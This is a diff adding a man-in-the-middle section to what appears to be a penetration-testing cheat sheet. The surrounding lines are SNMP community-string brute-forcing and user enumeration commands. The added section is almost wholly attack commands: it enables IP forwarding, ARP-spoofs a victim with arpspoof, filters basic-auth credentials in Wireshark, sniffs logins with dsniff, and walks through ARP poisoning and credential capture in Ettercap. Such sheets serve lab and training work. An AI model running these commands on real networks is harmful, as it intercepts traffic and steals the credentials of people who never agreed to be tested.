@@ -102,3 +102,22 @@ $ sudo nmap -sU -p 161 --script snmp-brute targetIP // Find available community 
 $ snmpwalk -v 2c -c public targetIP // Enumerate SNMP information, where v = snmp version and c = community string
 $ sudo nmap -sU -p 161 --script snmp-win32-users targetIP // Enumerate Windows users through SNMP
 ```
+_1.2.3 MitM Attack_  
+Manually  
+```
+$ sudo wireshark -i tap0 // Start wireshark on specificed interface
+$ echo 1 > /proc/sys/net/ipv4/ip_forward // Enable IP forwarding, makes attacker machine proxy between two victims
+$ arpspoof -i tap0 -t victimIP impersonatedIP // Telling the victim IP that we are impersonated IP via ARP reply
+$ arpspoof -i tap0 -t impersonatedIP victimIP
+!arp && http.authbasic // Filter basic authentication traffic in wireshark
+$ dsniff -i tap0 // Sniffs authentication packets on specified interface while Mitm running
+```
+Automatically: Ettercap
+```
+$ ettercap -G
+Sniff > Unified Sniffing > tap0 // Specify interface to sniff on
+Hosts > Scan for Hosts // Scans for available hosts on network
+Right-click to select Victim 1 and 2
+Mitm > ARP Poisoning > Sniff remote connections
+View > Connections // Ettercap filters credentials submitted in Mitm
+```
